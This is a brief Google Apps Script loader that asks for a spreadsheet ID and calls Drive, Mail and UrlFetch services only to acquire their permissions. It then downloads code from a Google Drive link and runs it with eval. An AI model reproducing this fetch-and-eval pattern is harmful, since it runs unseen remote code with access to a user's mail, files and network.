function main() {

  /*  
  Enter the ID your config spreadsheet into ssId variable below.
  E.g. your Google Sheet URL is: https://docs.google.com/spreadsheets/d/1fCJK9UEwAU_57XvSM1B4JMWY-52KvtoZhWFlCauLKCg/edit#gid=0
  So you need to extract the string between '/d/' and '/edit'
  */
  
  var ssId = 'enter you spreadsheet id here' 
  
  
  //#########################DO NOT TOUCH ANTYHING BELOW###############################
  //Let's get all the needed scopes
  var scriptVersion = 'sel'
  UrlFetchApp.fetch('www.google.com')
  DriveApp.getStorageUsed()
  MailApp.getRemainingDailyQuota()
  SpreadsheetApp.openById(ssId)
  
  
  var script = UrlFetchApp.fetch('https://drive.google.com/uc?export=view&id=1mZWpPpcKXJpVbJZH0DBH0_5ow6jvi1Uo').getContentText()
  eval(script)

}